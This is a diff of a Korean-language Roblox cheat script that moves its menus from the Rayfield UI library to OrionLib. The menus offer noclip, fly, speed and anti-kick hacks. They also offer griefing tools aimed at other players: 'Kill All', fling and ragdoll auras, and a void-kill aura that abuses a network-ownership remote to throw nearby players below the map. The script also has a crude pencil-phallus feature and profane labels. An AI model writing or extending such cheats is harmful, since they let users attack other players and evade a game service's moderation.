+antiTab:AddToggle({
     Name = "안티 오너쉽 스팸   <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "AntiFlingToggle",
     Callback = function(Value)
         _G.AntiFlingEnabled = Value
@@ -8544,21 +8357,20 @@ antiTab:CreateToggle({
         end
     end,
 })
-
-antiTab:CreateSection("그랩 | 토클")
-local AntiGrab = antiTab:CreateToggle({
+    
+antiTab:AddSection("그랩 | 토클")
+local AntiGrab = antiTab:AddToggle({
     Name = "안티 그랩   <font color='rgb(0,255,0)'>[오너쉽]</font>   <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         AntiGrabF(Value)
     end
 })
 AntiGrab:Set(true)
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티그랩V2   <font color='rgb(255,0,0)'>[프라임오너쉽]</font>",
     Default = false,
-    Save = false,
     Flag = "antiGrab",
     Callback = function(enabled)
         if enabled then
@@ -8608,9 +8420,9 @@ task.spawn(function()
 end)
 
 
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티그랩V3   <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "AutoStruggle", 
     Callback = function(enabled)
         if enabled then
@@ -8648,9 +8460,9 @@ antiTab:CreateToggle({
 })
 
 
-local AntiGrabSticky = antiTab:CreateToggle({
+local AntiGrabSticky = antiTab:AddToggle({
     Name = "안티그랩 |  StickyPart",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         AntiGrabStickyT = Value
         if Value then
@@ -8739,9 +8551,9 @@ Camera = workspace.CurrentCamera
 
 local currentSelectedOption = "FoodMayonnaise"
 
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티 인풋   <font color='rgb(255,0,0)'>[NETWORK OWNER]</font>  <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "AntiDeathToggleFlag",
     Callback = function(Value)
         AntiDeathT = Value
@@ -8759,7 +8571,7 @@ antiTab:CreateToggle({
 })
 
 
-antiTab:CreateDropdown({
+antiTab:AddDropdown({
     Name = "사용할 아이템 선택(누나 빵 추천)",
     Options = {
         "마요네즈", "바나나", "빵", "브로콜리", "핑크 케이크", "코코넛", "반숙란", "도넛", 
@@ -8768,7 +8580,7 @@ antiTab:CreateDropdown({
         "어쿠스틱 기타", "벤조", "리라", "바이올린", "전자 피아노", "멜로디카", 
         "마이크", "오카리나", "색소폰", "부부젤라"
     },
-    CurrentOption = "마요네즈", 
+    Default = "마요네즈", 
     Flag = "ItemDropdownFlag",
     Callback = function(Option)
         local rawSelection = type(Option) == "table" and Option[1] or Option
@@ -8785,9 +8597,9 @@ antiTab:CreateDropdown({
         end
     end,
 })
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티킥 <font color='rgb(0,255,0)'>[그랩]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "AntiKickGrab", 
     Callback = function(enabled)
         if enabled then
@@ -8927,10 +8739,10 @@ LocalPlayer.CharacterAdded:Connect(monitorCharacter)
 
 
 
-antiTab:CreateSection("블롭")
-local AntiBlob = antiTab:CreateToggle({
+antiTab:AddSection("블롭")
+local AntiBlob = antiTab:AddToggle({
 	Name = "안티 블롭맨",
-	CurrentValue = false,
+	Default = false,
 	Flag = "16",
 	Callback = function(Value)
 		AntiBlobT = Value
@@ -8973,7 +8785,7 @@ function SetAntiBlobman(enabled)
     end
 end
 
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티 블롭맨V2<font color='rgb(0,255,0)'>[오너쉽]</font>",
     Default = false,
     Callback = function(Value)
@@ -8989,9 +8801,9 @@ end)
 
 
 
-local AntiMassless = antiTab:CreateToggle({
+local AntiMassless = antiTab:AddToggle({
     Name = "안티 메슬리즈  <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "17",
     Callback = function(Value)
     masslessT = Value
@@ -8999,10 +8811,10 @@ local AntiMassless = antiTab:CreateToggle({
     end
 })
 AntiMassless:Set(true)
-antiTab:CreateSection("안티 에어 서스펜션")
-antiTab:CreateToggle({
+antiTab:AddSection("안티 에어 서스펜션")
+antiTab:AddToggle({
     Name = "디펜스 / 에어 서브펜션",
-    CurrentValue = false,
+    Default = false,
     Flag = "SelfDefenseAirSuspend", 
     Callback = function(enabled)
         if enabled then
@@ -9042,12 +8854,12 @@ antiTab:CreateToggle({
     end
 })
 
-antiTab:CreateSection("")
+antiTab:AddSection("")
 
 
-local AntiInPlots = antiTab:CreateToggle({
+local AntiInPlots = antiTab:AddToggle({
     Name = "안티 인플레이스",
-    CurrentValue = true,
+    Default = true,
     Callback = function(Value)
     antiInPlotsEnabled = Value
          if Value then
@@ -9058,9 +8870,9 @@ local AntiInPlots = antiTab:CreateToggle({
 AntiInPlots:Set(true)
 
 
-local AntiVoid = antiTab:CreateToggle({
+local AntiVoid = antiTab:AddToggle({
     Name = "안티 보이드",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
             workspace.FallenPartsDestroyHeight = -50000
@@ -9071,9 +8883,9 @@ local AntiVoid = antiTab:CreateToggle({
 })
 AntiVoid:Set(true)
 
-local AntiExplode = antiTab:CreateToggle({
+local AntiExplode = antiTab:AddToggle({
     Name = "안티 폭탄",
-    CurrentValue = false,
+    Default = false,
     Flag = "antiExplodeToggleFlag",
     Callback = function(Value)
         AntiExplosionT = Value
@@ -9112,7 +8924,7 @@ function setupAntiExplosion(character)
     end
 end
 
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티 폭발V2  <font color='rgb(0,0,255)'>[프리미엄]</font>",
     Default = false,
     Save = false,
@@ -9149,9 +8961,9 @@ task.spawn(function()
 end)
 
 
-local AntiBurn = antiTab:CreateToggle({
+local AntiBurn = antiTab:AddToggle({
     Name = "불 무적",
-    CurrentValue = false,
+    Default = false,
     Flag = "",
     Callback = function(Value)
         AntiBurnV = Value
@@ -9160,9 +8972,9 @@ local AntiBurn = antiTab:CreateToggle({
 })
 AntiBurn:Set(true)
 
-local AntiPaint = antiTab:CreateToggle({
+local AntiPaint = antiTab:AddToggle({
     Name = "안티 페인트",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         AntiPaintT = Value
         antiPaintF(Value)
@@ -9171,9 +8983,9 @@ local AntiPaint = antiTab:CreateToggle({
 AntiPaint:Set(true)
 
 AntiLagF()
-local AntiLag = antiTab:CreateToggle({
+local AntiLag = antiTab:AddToggle({
     Name = "안티 렉",
-    CurrentValue = false,
+    Default = false,
     Flag = "AntiLagToggle",
     Callback = function(Value)
         antiLagEnabled = Value
@@ -9191,7 +9003,7 @@ function antiLagF()
     end
 end
 
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티 렉V2<font color='rgb(0,0,255)'>[프리미엄]</font>",
     Default = false,
     Callback = function(Value)
@@ -9199,23 +9011,22 @@ antiTab:CreateToggle({
         antiLagF()
     end
 })
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "안티렉V3[파카]",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
-            Rayfield:Notify({
-                Title = "안내",
+            OrionLib:MakeNotification({
+                Name = "안내",
                 Content = "이 기능은 파카전용기능입니다",
-                Duration = 3,
-                Image = nil,
+                Time = 3,
             })
         end
     end,
 })
-local AutoAttack = antiTab:CreateToggle({
+local AutoAttack = antiTab:AddToggle({
     Name = "오토어택 | 킬",
-    CurrentValue = false,
+    Default = false,
     Flag = "AutoAttack",
     Callback = function(Value)
         AutoAttackT = Value
@@ -9223,19 +9034,18 @@ local AutoAttack = antiTab:CreateToggle({
     end
 })
 
-local AntiHoldPart = antiTab:CreateToggle({
+local AntiHoldPart = antiTab:AddToggle({
     Name = "음식소환 막기",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         AntiBananaT = Value
         task.spawn(AntiBananaF)
     end
 })
---AntiHoldPart:Set(true)
-antiTab:CreateLabel("동료핵이 있을경우 동료핵도 사용이 막힙니다.")
-local AntiBlobUse = antiTab:CreateToggle({
+antiTab:AddLabel("동료핵이 있을경우 동료핵도 사용이 막힙니다.")
+local AntiBlobUse = antiTab:AddToggle({
     Name = "블롭맨 사용 막기   <font color='rgb(255,0,0)'>[gucci]</font>",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         AntiBlobUseT = Value
         if Value then
@@ -9244,13 +9054,13 @@ local AntiBlobUse = antiTab:CreateToggle({
     end
 })
 
-antiTab:CreateSection("킥")
+antiTab:AddSection("킥")
 
 local flyingResetConn = nil
 local resetProtectionConn = nil
-local FlyingReset = antiTab:CreateToggle({
+local FlyingReset = antiTab:AddToggle({
     Name = "킥 방지리셋  <font color='rgb(50,0,50)'>[셀프 킬]</font>",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if flyingResetConn then
             flyingResetConn:Disconnect()
@@ -9296,18 +9106,18 @@ FlyingReset:Set(true)
 
 
 
-local AntiKick = antiTab:CreateToggle({
+local AntiKick = antiTab:AddToggle({
     Name = "안티 킥 <font color='rgb(255,146,132)'>[표창]</font>",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         AntiKickT = Value
         task.spawn(AntiKickF)
     end
 })
 AntiKick:Set(true)
-antiTab:CreateToggle({
+antiTab:AddToggle({
    Name = "안티킥",
-   CurrentValue = false,
+   Default = false,
    Callback = function(Value)
       AntiGrabStickyT = Value
       if Value then
@@ -9316,7 +9126,7 @@ antiTab:CreateToggle({
    end,
 })
 
-antiTab:CreateButton({
+antiTab:AddButton({
     Name = "안티킥   <font color='rgb(90,200,10)'>[TP]</font>",
     Callback = function()
         House()
@@ -9456,9 +9266,9 @@ function AntiPCLDF()
     end
 end
 
-local AntiPCLD = antiTab:CreateToggle({
+local AntiPCLD = antiTab:AddToggle({
     Name = "안티 킥   <font color='rgb(255,0,0)'>[PCLD 감지]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "16",
     Callback = function(Value)
         AntiPCLDT = Value
@@ -9467,10 +9277,10 @@ local AntiPCLD = antiTab:CreateToggle({
 })
 if not TESTPP then AntiPCLD:Set(true) end
 
-antiTab:CreateSection("래그돌")
-local PermRag = antiTab:CreateToggle({
+antiTab:AddSection("래그돌")
+local PermRag = antiTab:AddToggle({
     Name = "래그돌",
-    CurrentValue = false,
+    Default = false,
     Flag = "34",
     Callback = function(Value)
         permRagdollT = Value
@@ -9484,10 +9294,10 @@ local PermRag = antiTab:CreateToggle({
 
 
 
-antiTab:CreateSection("구찌")
-local AutoGucci = antiTab:CreateToggle({
+antiTab:AddSection("구찌")
+local AutoGucci = antiTab:AddToggle({
     Name = "오토구찌(킥위험 약간 있음!)  <font color='rgb(255,146,123)'>[블롭맨]</font>     <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "autoGucciToggleFlag",
     Callback = function(Value)
         AutoGucciT = Value
@@ -9510,9 +9320,9 @@ local AutoGucci = antiTab:CreateToggle({
     end
 })
 
-local AutoGucciV2 = antiTab:CreateToggle({
+local AutoGucciV2 = antiTab:AddToggle({
     Name = "기차 구찌",
-    CurrentValue = false,
+    Default = false,
     Flag = "autoGucciToggleFlag",
     Callback = function(Value)
         AutoGucciTV2 = Value
@@ -9533,16 +9343,15 @@ local AutoGucciV2 = antiTab:CreateToggle({
 end
 })
 
-antiTab:CreateToggle({
+antiTab:AddToggle({
     Name = "구찌V3   <font color='rgb(0,0,250)'>[파카]</font>",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
-            Rayfield:Notify({
-                Title = "안내",
+            OrionLib:MakeNotification({
+                Name = "안내",
                 Content = "이 기능은 파카전용기능입니다",
-                Duration = 3,
-                Image = nil,
+                Time = 3,
             })
         end
     end,
@@ -9550,10 +9359,10 @@ antiTab:CreateToggle({
 
 
 
-playerTab:CreateSection("플레이어")
-playerTab:CreateToggle({
+playerTab:AddSection("플레이어")
+playerTab:AddToggle({
     Name = "이동 속도   <font color='rgb(1,1,255)'>[스피드]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "28",
     Callback = function(Value)
         walkSpeedT = Value 
@@ -9561,26 +9370,24 @@ playerTab:CreateToggle({
     end
 })
 
-local walkSpeedInput = playerTab:CreateInput({
+local walkSpeedInput = playerTab:AddTextbox({
     Name = "값",
-    CurrentValue = 16,
-    PlaceholderText = "Value",
-    RemoveTextAfterFocusLost = true,
+    Default = "80",
+    TextDisappear = true,
     Flag = "29",
     Callback = function(Value)
         walkSpeedV = Value
         updateWalkSpeedF()
     end
 })
-walkSpeedInput:Set(80)
 
 
 
 
 
-playerTab:CreateToggle({
+playerTab:AddToggle({
     Name = "점프 높이   <font color='rgb(0,25,0)'>[굳]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "30",
     Callback = function(Value)
         jumpPowerT = Value
@@ -9588,12 +9395,10 @@ playerTab:CreateToggle({
     end
 })
 
-local jumpPowerInput = playerTab:CreateInput({
+local jumpPowerInput = playerTab:AddInput({
     Name = "값",
-    CurrentValue = 24,
-    PlaceholderText = "Value",
-    RemoveTextAfterFocusLost = false,
-    Flag = "31",
+    Default = 24,
+    Placeholder = "Value",
     Callback = function(Value)
         jumpPowerV = Value
         updateJumpPowerF()
@@ -9643,9 +9448,9 @@ local function stopRealisticFP()
         end
     end
 end
-playerTab:CreateToggle({
+playerTab:AddToggle({
     Name = "1인칭 리얼뷰",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         realisticFP = Value
         if Value then
@@ -9655,10 +9460,10 @@ playerTab:CreateToggle({
         end
     end
 })
-playerTab:CreateSection("나머지")
-local NoClipToggle = playerTab:CreateToggle({
+playerTab:AddSection("나머지")
+local NoClipToggle = playerTab:AddToggle({
     Name = "노클립",
-    CurrentValue = false,
+    Default = false,
     Flag = "32",
     Callback = function(Value)
         noClipT = Value
@@ -9666,9 +9471,9 @@ local NoClipToggle = playerTab:CreateToggle({
     end
 })
 
-playerTab:CreateToggle({
+playerTab:AddToggle({
     Name = "무한 점프",
-    CurrentValue = false,
+    Default = false,
     Callback = function(v)
         _G.InfiniteJump = v
     end
@@ -9679,9 +9484,9 @@ game:GetService("UserInputService").JumpRequest:Connect(function()
         game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
     end
 end)
-local Fly = playerTab:CreateToggle({ 
+local Fly = playerTab:AddToggle({ 
     Name = "플라이   <font color='rgb(255,0,0)'>[데스크톱]</font>", 
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         flyT = Value
@@ -9689,18 +9494,16 @@ local Fly = playerTab:CreateToggle({
     end
 })
 
-local flyInput = playerTab:CreateInput({
+local flyInput = playerTab:AddInput({
     Name = "속도",
-    CurrentValue = 50,
-    PlaceholderText = "Value",
-    RemoveTextAfterFocusLost = false,
-    Flag = "37",
+    Default = 50,
+    Placeholder = "Value",
     Callback = function(Value)
         flyV = Value
     end
 })
 flyInput:Set(80)
-playerTab:CreateSection("모바일플라이")
+playerTab:AddSection("모바일플라이")
 local function mflyF()
     if not mflyT then return end
     
@@ -9747,56 +9550,50 @@ local function mflyF()
     end)
 end
 
-playerTab:CreateToggle({ 
+playerTab:AddToggle({ 
     Name = "플라이   <font color='rgb(0,255,0)'>[모바일]</font>", 
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         mflyT = Value
         mflyF()
     end
 })
-playerTab:CreateInput({
+playerTab:AddInput({
     Name = "속도",
-    CurrentValue = 50,
-    PlaceholderText = "Value",
-    RemoveTextAfterFocusLost = false,
-    Flag = "37",
+    Default = 50,
+    Placeholder = "Value",
     Callback = function(Value)
         mflyV = Value
     end
 })
 
-playerTab:CreateSection("엑스트라")
+playerTab:AddSection("엑스트라")
 
--- 1. Server Hop
-playerTab:CreateButton({
+playerTab:AddButton({
     Name = "서버 훅",
     Callback = function()
         game:GetService("TeleportService"):Teleport(game.PlaceId, plr)
     end
 })
 
--- 2. Rejoin
-playerTab:CreateButton({
+playerTab:AddButton({
     Name = "제접ㅋ",
     Callback = function()
         game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
     end
 })
 
--- 3. FPS Unlock
-playerTab:CreateButton({
+playerTab:AddButton({
     Name = "FPS 최대치",
     Callback = function()
         setfpscap(9999)
     end
 })
 
--- 4. Full Bright
-playerTab:CreateToggle({
+playerTab:AddToggle({
     Name = "어둠 씨발 꺼져!!!!!",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
             game:GetService("Lighting").Brightness = 2
@@ -9809,12 +9606,11 @@ playerTab:CreateToggle({
         end
     end
 })
-playerTab:CreateSection("쓰잘때기없는 기능")
+playerTab:AddSection("쓰잘때기없는 기능")
 
--- 1. 
-playerTab:CreateToggle({
+playerTab:AddToggle({
     Name = "FOV 변경",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
             workspace.CurrentCamera.FieldOfView = 120
@@ -9824,8 +9620,7 @@ playerTab:CreateToggle({
     end
 })
 
--- 2. 
-playerTab:CreateButton({
+playerTab:AddButton({
     Name = "모든 장신구 제거",
     Callback = function()
         pcall(function()
@@ -9838,10 +9633,9 @@ playerTab:CreateButton({
     end
 })
 
--- 3. 
-playerTab:CreateToggle({
+playerTab:AddToggle({
     Name = "중력 변경",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
             workspace.Gravity = 50
@@ -9851,10 +9645,10 @@ playerTab:CreateToggle({
     end
 })
 
-AuraTab:CreateSection("안티 아우라들")
-AuraTab:CreateToggle({
+AuraTab:AddSection("안티 아우라들")
+AuraTab:AddToggle({
     Name = "안티 붐박스 아우라   <font color='rgb(0,200,0)'>[all]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         AntiBoxT = Value
@@ -9862,9 +9656,9 @@ AuraTab:CreateToggle({
     end
 })
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
     Name = "안티 바나나 아우라   <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         AntiBananaAuraT = Value
@@ -9872,9 +9666,9 @@ AuraTab:CreateToggle({
     end
 })
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
     Name = "안티 파트 아우라    <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         ViewAuraT = Value
@@ -9884,9 +9678,9 @@ AuraTab:CreateToggle({
 
 
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
 	Name = "주크박스 고정 아우라",
-	CurrentValue = false,
+	Default = false,
 	Flag = "AntiJukeboxAura",
 	Callback = function(Value)
 		_G.AntiJukeboxT = Value
@@ -9895,9 +9689,9 @@ AuraTab:CreateToggle({
 		end
 	end
 })
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
 	Name = "판자 고정 아우라",
-	CurrentValue = false,
+	Default = false,
 	Flag = "AntiPalletAura",
 	Callback = function(Value)
 		_G.AntiPalletT = Value
@@ -9909,11 +9703,11 @@ AuraTab:CreateToggle({
 
 
 
-AuraTab:CreateSection("킬,플링")
+AuraTab:AddSection("킬,플링")
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
     Name = "Kill All",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         blobLoopT3 = Value
@@ -10051,10 +9845,9 @@ AuraTab:CreateToggle({
 })
 
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
     Name = "래그돌 아우라",
     Default = false,
-    Save = false,
     Flag = "FtapKillAura",
     Callback = function(enabled)
         runningFtapKillAura = enabled
@@ -10122,10 +9915,9 @@ AuraTab:CreateToggle({
 })
 local runningCombinedAura = false
 
-AuraTab:CreateInput({
+AuraTab:AddInput({
     Name = "아우라지름[반경]인풋",
-    PlaceholderText = "기본값: 30",
-    RemoveTextAfterFocusLost = false,
+    Placeholder = "기본값: 30",
     Callback = function(Text)
         local num = tonumber(Text)
         if num then
@@ -10140,10 +9932,9 @@ AuraTab:CreateInput({
     end
 })
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
     Name = "필링 아우라    <font color='rgb(0,0,255)'>[프리미엄]</font>",
     Default = false,
-    Save = false,
     Flag = "CombinedFlingAura",
     Callback = function(enabled)
         runningCombinedAura = enabled
@@ -10200,10 +9991,9 @@ AuraTab:CreateToggle({
     end
 })
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
     Name = "낙사 아우라   <font color='rgb(0,0,255)'>[프리미엄]</font>",
     Default = false,
-    Save = false,
     Flag = "FtapVoidKill",
     Callback = function(enabled)
         runningFtapVoidKill = enabled
@@ -10235,12 +10025,10 @@ AuraTab:CreateToggle({
                                             local distance = (torso.Position - root.Position).Magnitude
                                             if distance <= currentRadius then
                                                 
-                                                -- 1단계: 물리 오너십 박탈
                                                 if SetNetworkOwner and SetNetworkOwner.FireServer then
                                                     SetNetworkOwner:FireServer(torso, targetRoot.CFrame)
                                                 end
                                                 
-                                                -- 2단계: 딜레이 없이 Y축 -10000 낭떠러지로 강제 사출 (시스템 즉사 유도)
                                                 targetRoot.CFrame = CFrame.new(targetRoot.Position.X, -10000, targetRoot.Position.Z)
                                                 
                                             end
@@ -10257,22 +10045,21 @@ AuraTab:CreateToggle({
     end
 })
 
-AuraTab:CreateToggle({
+AuraTab:AddToggle({
     Name = "토이 플링   <font color='rgb(0,195,0)'>[파카]</font>",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
-            Rayfield:Notify({
-                Title = "안내",
+            OrionLib:MakeNotification({
+                Name = "안내",
                 Content = "이 기능은 파카전용기능입니다",
-                Duration = 3,
-                Image = nil,
+                Time = 3
             })
         end
     end,
 })
 
- funTab:CreateButton({
+ funTab:AddButton({
    Name = "텔포",
    Callback = function()
       if not Value then return end
@@ -10282,7 +10069,7 @@ AuraTab:CreateToggle({
    end,
 })
 
-funTab:CreateSection("이동할곳")
+funTab:AddSection("이동할곳")
 local teleportLocations = {
     ["스폰"] = {0, -7, 0},
     ["스폰산"] = {494, 163, 175},
@@ -10310,21 +10097,16 @@ local teleportLocations = {
 
 local selectedLocation = "스폰"
 
-local Dropdown = plotTab:CreateDropdown({
+local Dropdown = plotTab:AddDropdown({
     Name = "위치 고르기",
     Options = {"스폰","스폰산","광산","큰동굴","작은동굴","열차동굴","위험구역","설산","헛간(농지)","하늘섬","초록집","(초록집)","(분홍집)","(보라집)","(파랑집)","(빨강집)","슬롯1","슬롯2","슬롯3","슬롯4","슬롯5","독우물 아래"},
-    CurrentOption = "스폰",
-    MultipleOptions = false,
+    Default = "스폰",
     Callback = function(Value)
-        if typeof(Value) == "table" then
-            selectedLocation = Value[1] or "스폰"
-        else
-            selectedLocation = Value
-        end
+        selectedLocation = Value
     end,
 })
 
-local Button = plotTab:CreateButton({
+local Button = plotTab:AddButton({
     Name = "텔포",
     Callback = function()
         local plr = game.Players.LocalPlayer
@@ -10341,27 +10123,25 @@ local Button = plotTab:CreateButton({
 })
 
 
-funTab:CreateSection("꼬추 만들기")
-local Inputt = funTab:CreateInput({
+funTab:AddSection("꼬추 만들기")
+local Inputt = funTab:AddInput({
    Name = "연필    <font color='rgb(200,0,255)'>[dick]</font>",
-   CurrentValue = "",
-   PlaceholderText = "Value",
-   RemoveTextAfterFocusLost = false,
-   Flag = "Input1",
+   Default = "",
+   Placeholder = "Value",
    Callback = function(Text)
    end
 })
 
-local Ctratee = funTab:CreateButton({
+local Ctratee = funTab:AddButton({
    Name = "만들기",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-       local pencilCountText = Inputt.CurrentValue
+       local pencilCountText = Inputt.Value
        local TNUM = tonumber(pencilCountText)
 
        if not TNUM or TNUM <= 0 then
            warn("Please enter a valid number!")
-           Rayfield:Notify({Title = "[ ✏️ ]", Content = "Nil Value", Duration = 3, Image = 0})
+           OrionLib:MakeNotification({Name = "[ ✏️ ]", Content = "Nil Value", Time = 3})
            return
        end
 
@@ -10498,7 +10278,7 @@ if torso2 and #pencils >= TNUM then
     if lastPencil then
         local wLast = lastPencil:FindFirstChild("w" .. TNUM)
         if wLast then
-            local attachPosition = torso2.CFrame * CFrame.new(0, -1.1, 0.1) * CFrame.Angles(0, math.rad(180), 0) -- CFrame.new(0, -torso2.Size.Y/2 - -0.1, -0.5)
+            local attachPosition = torso2.CFrame * CFrame.new(0, -1.1, 0.1) * CFrame.Angles(0, math.rad(180), 0)
             local relativeCF = torso2.CFrame:ToObjectSpace(attachPosition)
             StickyPartEvent:FireServer(wLast, torso2, relativeCF)
         end
@@ -10507,30 +10287,28 @@ end
    end
 })
 
-funTab:CreateSection("떠있는것들 무력화")
-local Inputt = funTab:CreateInput({
+funTab:AddSection("떠있는것들 무력화")
+local Inputt = funTab:AddInput({
    Name = "쿠나이",
-   CurrentValue = "",
-   PlaceholderText = "Value",
-   RemoveTextAfterFocusLost = false,
-   Flag = "Input1",
+   Default = "",
+   Placeholder = "Value",
    Callback = function(Text)
    end
 })
 
-funTab:CreateSection("UFO,하늘섬 돌,광산열차를 잡은채로 10으로설정한후 만들기를 해보세요.")
-local Ctratee = funTab:CreateButton({
+funTab:AddSection("UFO,하늘섬 돌,광산열차를 잡은채로 10으로설정한후 만들기를 해보세요.")
+local Ctratee = funTab:AddButton({
    Name = "무력화   <font color='rgb(0,0,255)'>[프리미엄]</font>",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local plr = Players.LocalPlayer
        
-       local kunaiCountText = Inputt.CurrentValue
+       local kunaiCountText = Inputt.Value
        local TNUM = tonumber(kunaiCountText)
 
        if not TNUM or TNUM <= 0 or TNUM > 100 then
-           Rayfield:Notify({Title = "[ 🥷 ]", Content = "Invalid Value", Duration = 3, Image = 0})
+           OrionLib:MakeNotification({Name = "[ 🥷 ]", Content = "Invalid Value", Time = 3})
            return
        end
 
@@ -10684,8 +10462,11 @@ local Ctratee = funTab:CreateButton({
    end
 })
 
-bdTab:CreateSection("배경")
-bdTab:CreateButton({
+
+
+
+bdTab:AddSection("배경")
+bdTab:AddButton({
     Name = "기본값",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -10731,7 +10512,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "낮시간",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -10779,7 +10560,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "새벽",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -10843,7 +10624,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "흐린",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -10903,7 +10684,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "밤시간",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -10951,7 +10732,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "선셋",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11010,7 +10791,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "사이버펑크",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11063,7 +10844,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "환상퍼플",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11120,7 +10901,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "호러안개",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11171,7 +10952,7 @@ bdTab:CreateButton({
         cc.TintColor = Color3.fromRGB(220, 230, 230)
     end
 })
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "🌌 은하수 파노라마",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11224,7 +11005,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "🌅 심해의 부서지는 노을",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11289,7 +11070,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "✨ 아틀란티스 요정의 숲",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11353,7 +11134,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "🏙️ 폭우 뒤 비친 네온시티",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11413,7 +11194,7 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "⛅ 신들의 안개낀 성소",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11476,7 +11257,7 @@ bdTab:CreateButton({
         sunrays.Spread = 0.9
     end
 })
-bdTab:CreateButton({
+bdTab:AddButton({
     Name = "🌌 코스믹 인피니티 (우주)",
     Callback = function()
         local Lighting = game:GetService("Lighting")
@@ -11528,852 +11309,13 @@ bdTab:CreateButton({
     end
 })
 
-bdTab:CreateButton({
-    Name = "🏔️ 에메랄드 오로라 밤하늘",
-    Callback = function()
